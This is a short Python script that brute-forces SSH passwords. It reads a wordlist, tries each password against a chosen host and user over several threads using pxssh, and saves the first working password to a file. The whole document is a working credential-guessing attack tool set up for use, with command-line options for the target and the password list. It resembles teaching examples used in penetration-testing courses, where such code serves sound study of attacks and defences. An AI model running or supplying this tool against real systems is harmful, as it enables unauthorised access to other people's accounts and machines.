from pexpect import pxssh
import optparse
import time
import sys
from threading import BoundedSemaphore, Thread
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print( '[+] Password Found: ' + password)
        Found = True

        with open('found_password.txt', 'w') as f:
            f.write(password)
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()

def main():
    parser = optparse.OptionParser('usage%prog '+\
        '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', \
        help='target host')
    parser.add_option('-F', dest='passwdFile', type='string', \
        help='password file')
    parser.add_option('-u', dest='user', type='string', \
        help='user')
    
    (option, args) = parser.parse_args()
    host = option.tgtHost
    passwdFile = option.passwdFile
    user = option.user

    if host is None or passwdFile is None or user is None:
        print(parser.usage)
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print('[*] Exiting - Found')
            exit(0)
        if Fails > 5:
            print('[!] Exiting - Socket Timeout')
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Trying - " + str(password))
        t = Thread(target=connect, args=(host, user, \
                password, True))
        child = t.start()
if __name__ == '__main__':
    main()

